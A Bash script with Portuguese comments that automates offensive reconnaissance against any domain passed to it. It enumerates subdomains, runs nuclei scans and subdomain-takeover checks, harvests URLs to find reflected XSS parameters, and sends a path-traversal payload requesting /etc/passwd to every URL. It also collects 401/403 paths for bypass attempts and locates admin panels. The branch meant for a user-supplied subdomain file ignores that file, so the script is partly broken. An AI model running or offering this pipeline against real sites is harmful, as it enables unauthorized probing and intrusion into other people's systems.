#!/bin/bash
    echo "MODO DE USO"
    echo "./lowfruit.sh <dominio> <arquivo de sudominios>"
    echo "Obs: Caso não tenha o arquivo de subdominios o script fara a enumeração sozinho"
    echo ""

if [ "$2" == "" ]
then
    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
    amass enum --passive -d $1 -o domains_$1
    assetfinder --subs-only $1 | tee -a domains_$1

    subfinder -d $1 -o domains_subfinder_$1
    cat domains_subfinder_$1 | tee -a domains_$1

    sort -u domains_$1 -o domains_$1
    cat domains_$1 | filter-resolved | tee -a domains_$1.txt
    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#

    # Scaner de vuln
    nuclei -l domains_$1.txt

    # Subdomain takeonver
    subzy -targets domains_$1 | tee subdomainTakeOver.txt

    # Excluindo subdominios offline depois de tantar takeonver
    rm domains_$1

    # Procurar URLs com base na internet
    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt

    # Encontrar todos os parametros
    grep "=" allUrls.txt | tee allParams.txt

    # Encontrar parametros refletidos
    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest

    # Validar Path Transversal
    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt

    # Encontrar extensões
    mkdir ext
    cat allUrls.txt | grep -i "\.log$" | tee ext/log.txt
    cat allUrls.txt | grep -i "\.bak$" | tee ext/bak.txt
    cat allUrls.txt | grep -i "\.xlsx$" | tee ext/xlsx.txt
    cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt

    # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt

    # Encontrar paineis administrativos
    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt

    echo ""
    echo "Enumeração realizada"

else

    # Scaner de vuln
    nuclei -l domains_$1.txt

    # Subdomain takeonver
    subzy -targets domains_$1 | tee subdomainTakeOver.txt

    # Excluindo subdominios offline depois de tantar takeonver
    rm domains_$1

    # Procurar URLs com base na internet
    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt

    # Encontrar todos os parametros
    grep "=" allUrls.txt | tee allParams.txt

    # Encontrar parametros refletidos
    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest

    # Validar Path Transversal
    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt

    # Encontrar extensões
    mkdir ext
    cat allUrls.txt | grep -i "\.log$" | tee ext/log.txt
    cat allUrls.txt | grep -i "\.bak$" | tee ext/bak.txt
    cat allUrls.txt | grep -i "\.xlsx$" | tee ext/xlsx.txt
    cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt

    # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt

    # Encontrar paineis administrativos
    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt

    echo ""
    echo "Enumeração realizada"
fi
